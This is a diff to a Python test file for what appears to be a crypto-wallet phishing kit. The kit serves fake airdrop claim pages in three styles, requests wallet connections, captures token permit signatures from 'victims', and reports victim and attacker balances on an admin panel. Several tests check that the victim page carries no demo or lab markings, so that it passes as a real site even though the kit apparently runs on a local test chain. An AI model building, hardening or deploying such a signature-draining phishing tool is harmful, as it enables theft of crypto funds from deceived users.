@@ -97,8 +97,18 @@ class TestLoadConfig:
         with pytest.raises(SystemExit, match="claim_mode"):
             phish.load_config(str(p))
 
+    def test_bad_style_exits(self, tmp_path):
+        cfg = yaml.safe_load(EXAMPLE.read_text())
+        cfg["site"]["style"] = "windows98"
+        p = tmp_path / "c.yaml"
+        p.write_text(yaml.dump(cfg, allow_unicode=True))
+        with pytest.raises(SystemExit, match="style"):
+            phish.load_config(str(p))
+
 
 class TestSitePage:
+    STYLES = {"official": "Claim 立即领取", "meme": "CLAIM NOW", "exchange": "立即领取"}
+
     def test_page_has_no_demo_markings(self, server):
         status, page = _get(server + "/")
         assert status == 200
@@ -106,10 +116,24 @@ class TestSitePage:
         for banned in ("演示", "triplab-case", "仅为本地", "仅限本地", "anvil", "test key"):
             assert banned not in text, f"受害者页面泄漏了演示字样: {banned}"
 
-    def test_page_injects_config(self, server):
+    def test_page_injects_config_and_shared_js(self, server):
         _, page = _get(server + "/")
         assert "星穹协议 NovaChain" in page
         assert "__CONFIG_JSON__" not in page and "__PROJECT__" not in page
+        assert '<script src="/app.js"></script>' in page
+        status, js = _get(server + "/app.js")
+        assert status == 200 and "eth_requestAccounts" in js and "__CONFIG_JSON__" not in js
+
+    def test_all_three_styles_served_clean(self, server):
+        for style, marker in self.STYLES.items():
+            cfg = phish.load_config(str(EXAMPLE))
+            phish.Handler.cfg = {**cfg, "site": {**cfg["site"], "style": style}}
+            status, page = _get(server + "/")
+            assert status == 200 and marker in page, f"style={style} 页面异常"
+            low = page.lower()
+            for banned in ("演示", "anvil", "traplab"):
+                assert banned not in low, f"style={style} 泄漏: {banned}"
+        phish.Handler.cfg = phish.load_config(str(EXAMPLE))
 
 
 class TestAdminGate:
@@ -148,6 +172,21 @@ class TestEventFlow:
         state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
         item = next(i for i in state["items"] if i["id"] == body["itemId"])
         assert item["status"] == "pending" and item["type"] == "permit"
+
+    def test_state_includes_meta_and_balances(self, server):
+        _post(server + "/api/event", {"type": "connect", "address": "0x" + "cd" * 20})
+        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
+        assert state["meta"]["symbol"] == "AIRDROP"
+        assert state["meta"]["attacker"].startswith("0x")
+        assert state["balances"]["attacker"] >= 0
+        assert state["balances"]["victim"]["address"] == "0x" + "cd" * 20
+
+    def test_last_victim_falls_back_to_items(self, server):
+        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
+        _post(server + "/api/event", {"type": "permit", "owner": "0x" + "ef" * 20,
+                                      "sig": sig, "value": hex(5), "deadline": "1", "nonce": "0"})
+        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
+        assert state["balances"]["victim"]["address"] == "0x" + "ef" * 20
 
     def test_bad_request_does_not_kill_server(self, server):
         req = urllib.request.Request(server + "/api/event", data=b"not json",
